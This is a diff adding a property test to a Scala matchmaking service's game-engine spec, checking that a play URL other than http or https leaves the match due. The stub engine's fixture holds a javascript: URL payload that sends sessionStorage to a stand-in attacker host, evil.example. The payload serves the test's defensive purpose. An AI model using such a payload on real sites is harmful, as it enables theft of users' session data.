@@ -604,6 +604,67 @@ class GameEngineServiceSpec extends PropertySuite {
         }
     }
 
+    // A play url is opened in a tab of matchmaker's own origin and put in mail, so an engine that answers with a
+    // `javascript:` one is an engine whose answer cannot be used: the match is left due, as for any failed call.
+    property("an engine that answers with a url other than http or https leaves the match due") {
+        forAll(genUniqueString, genUniqueString, genUniqueString, genUniqueString) {
+            (nickname, externalId, gameExternalId, otherExternalId) =>
+                val scripted = TestServices.servicesInline(engine =
+                    new StubEngine(response =
+                        CreateGameResponse(
+                          statusUrl = "https://engine/status/1",
+                          playUrl = "javascript:fetch('https://evil.example/?'+sessionStorage)//",
+                          publicUrl = None
+                        )
+                    )
+                )
+                val result = for {
+                    fixture <- makeFixture(
+                      nickname = nickname,
+                      externalId = externalId,
+                      gameExternalId = gameExternalId
+                    )
+                    found <- opponent(
+                      services = scripted,
+                      fixture = fixture,
+                      nickname = s"other-$nickname",
+                      externalId = otherExternalId
+                    )
+                    (other, otherCharacter) = found
+                    seats = List(
+                      Challenges
+                          .Seat(
+                            player = fixture.owner,
+                            role = fixture.game.roles(0).gameRoleId,
+                            character = Some(fixture.character.characterId)
+                          ),
+                      Challenges.Seat(
+                        player = other,
+                        role = fixture.game.roles(1).gameRoleId,
+                        character = Some(otherCharacter.characterId)
+                      )
+                    )
+                    t <- Challenges.offered(services = scripted, game = fixture.game, seats = seats)
+                    _ <- Challenges.startAndBegin(
+                      services = scripted,
+                      game = fixture.game,
+                      t = t,
+                      owner = fixture.owner
+                    )
+                    matchId <- Challenges.choose(
+                      services = scripted,
+                      game = fixture.game,
+                      t = t,
+                      seats = seats,
+                      viewer = fixture.owner,
+                      settled = _ == TournamentMatchStatus.Due
+                    )
+                    stranded <- matchOf(fixture.game.gameId, matchId)
+                } yield stranded.exists(m => m.status == MatchStatus.Due && m.playUrl.isEmpty)
+                result.timeout(30.seconds).unsafeRunSync()
+        }
+    }
+
     property("a move callback moves the turn on, and is authorized by the game's external id") {
         forAll(genUniqueString, genUniqueString, genUniqueString) { (nickname, externalId, gameExternalId) =>
             val services = TestServices.servicesWith(engine = StubEngine())
